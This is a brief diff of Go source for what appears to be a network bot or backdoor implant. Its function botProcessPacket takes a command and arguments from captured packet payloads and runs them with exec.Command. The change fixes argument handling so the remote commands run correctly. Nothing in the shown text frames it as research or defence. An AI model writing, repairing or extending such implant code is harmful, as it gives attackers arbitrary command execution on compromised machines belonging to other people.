@@ -36,10 +36,9 @@ func botProcessPacket(packet gopacket.Packet) {
 
 	payload := strings.Split(data, " ")
 	command := payload[1]
-	// args := payload[2:]
-	args := strings.Join(payload[2:], " ")
+	args := payload[2:]
 
-	out, err := exec.Command(command, args).Output()
+	out, err := exec.Command(command, args...).Output()
 	if err != nil {
 		fmt.Println("[-] ERROR:", err)
 	}
